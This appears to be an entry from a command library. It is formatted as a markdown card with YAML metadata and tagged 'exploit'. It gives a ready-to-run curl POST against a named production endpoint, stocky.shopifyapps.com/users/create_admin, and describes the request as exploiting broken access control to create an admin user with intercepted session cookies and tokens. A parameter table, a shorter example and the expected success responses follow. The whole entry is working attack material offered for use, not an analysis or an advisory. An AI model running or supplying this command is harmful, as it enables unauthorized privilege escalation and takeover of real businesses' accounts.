---
data: >-
  curl -X POST https://stocky.shopifyapps.com/users/create_admin -H "Cookie:
  [REPLACE COOKIES]" -H "Content-Type: application/x-www-form-urlencoded" -H
  "Host: stocky.shopifyapps.com" -H "Origin: https://stocky.shopifyapps.com" -H
  "Referer: https://stocky.shopifyapps.com/preferences/users" --data-urlencode
  "utf8=%E2%9C%93" --data-urlencode "authenticity_token=[REPLACE TOKEN]"
  --data-urlencode "user[first_name]=Admin" --data-urlencode
  "user[last_name]=User" --data-urlencode "user[email]=admin@example.com"
  --data-urlencode "commit=Create+%26+Login" --http2
tags:
  - http-post
  - exploit
  - rails
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.381Z'
id: 53ce63ed-2c27-4199-a6b8-a3c1a2a7c4e4
verified: false
validated: true
submitted: true
---
# curl-post-create-admin

## Command

```bash
curl -X POST https://stocky.shopifyapps.com/users/create_admin \
  -H "Cookie: [REPLACE COOKIES]" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Host: stocky.shopifyapps.com" \
  -H "Origin: https://stocky.shopifyapps.com" \
  -H "Referer: https://stocky.shopifyapps.com/preferences/users" \
  --data-urlencode "utf8=%E2%9C%93" \
  --data-urlencode "authenticity_token=[REPLACE TOKEN]" \
  --data-urlencode "user[first_name]=Admin" \
  --data-urlencode "user[last_name]=User" \
  --data-urlencode "user[email]=admin@example.com" \
  --data-urlencode "commit=Create+%26+Login" \
  --http2
```

## Description

This curl command sends a form-encoded POST request to the Stocky /users/create_admin endpoint, exploiting broken access control to create an admin user. It requires replacing placeholders with intercepted session cookies and authenticity token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Cookie: ..."` | Session cookies from interception | Yes |
| `--data-urlencode` | URL-encodes form fields like authenticity_token and user data | Yes |
| `--http2` | Uses HTTP/2 protocol as required by the endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://stocky.shopifyapps.com/users/create_admin -H "Cookie: _stocky_session=abc123" --data-urlencode "authenticity_token=def456" --data-urlencode "user[email]=admin@test.com" --http2
```

### Advanced Usage

Include full headers and all form fields as shown in the main command for production-like requests.

## Expected Output

Successful response: HTTP 200 OK or 302 Found with Location header to login or dashboard, body may include success message like "Admin created". Failure: 403 or 422 with auth error.

## Related

- [[Related Procedure: Exploit-Create-Admin-Endpoint]]
